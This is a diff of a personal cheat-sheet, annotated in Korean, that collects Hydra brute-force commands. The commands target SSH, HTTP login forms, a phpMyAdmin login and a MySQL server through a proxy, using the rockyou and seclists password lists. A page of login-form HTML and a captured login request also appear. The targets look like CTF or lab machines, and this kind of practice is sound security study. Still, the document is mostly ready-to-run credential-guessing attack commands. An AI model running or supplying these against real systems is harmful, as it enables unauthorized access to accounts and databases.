@@ -3,6 +3,9 @@
 ```bash
 hydra -l <username> -P <full path to pass> 10.201.20.141 -t 4 ssh
 
+apt install seclists
+apt install wordlists
+
 # 주요 옵션
 # -l : 단일 사용자명
 # -L : 사용자명 리스트
@@ -36,8 +39,6 @@ hydra -l scr1ptkiddy -P passwords.txt 10.10.136.50 http-post-form \
 # [22][ssh] host: 10.10.10.10 login: root password: 123456
 ```
 
-
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -56,39 +57,25 @@ hydra -l scr1ptkiddy -P passwords.txt 10.10.136.50 http-post-form \
       <label for="username">Username:</label><input type="text" class="form-control" value="" id="username" name="username" />
       <label for="password">Password:</label><input type="password" class="form-control" value="" id="password" name="password" />
 
-      
     </br><input type="submit" value="Login" class="btn btn-success" name="sub"/>
     </form>
+
   </div>
 
 </body>
 </html>
 
-
-
 sudo hydra -l R1ckRul3s -P rockyou.txt 10.65.165.164 http-post-form "/login.php:username=^USER^&password=^PASS^&submit=Login:F=login failed"
 
-
 - burpsuite form
-
-POST /login/index.php HTTP/1.1
-Host: 192.168.110.101
-Content-Length: 51
-Cache-Control: max-age=0
-Accept-Language: ko-KR,ko;q=0.9
-Upgrade-Insecure-Requests: 1
-Content-Type: application/x-www-form-urlencoded
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
-Origin: http://192.168.110.101
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: http://192.168.110.101/login/
-Accept-Encoding: gzip, deflate, br
-Cookie: ISPCSESS=n5g33db3sjduau5fkoocckdvss
-Connection: keep-alive
-
-username=test&password=test2&s_mod=login&s_pg=index
-
+  username=test&password=test2&s_mod=login&s_pg=index
 
 ```bash
 hydra -L /usr/share/wordlists/seclists/Passwords/Common-Credentials/common-passwords-win.txt -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/common-passwords-win.txt 192.168.110.101 http-post-form "/login/index.php:username=^USER^&password=^PASS^:F=로그인실패문구"
 ```
+
+HYDRA_PROXY=http://192.168.199.189:3128 hydra -L users.txt -P passes.txt -s 8080 127.0.0.1 http-post-form "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=2&target=index.php&token=TOKEN:F=Access denied" -t 4 -f -V
+
+- DB bruteforce with proxy
+
+HYDRA_PROXY=http://192.168.199.189:3128 hydra -l root -P passes.txt -s 3307 127.0.0.1 mysql -t 4 -f -V
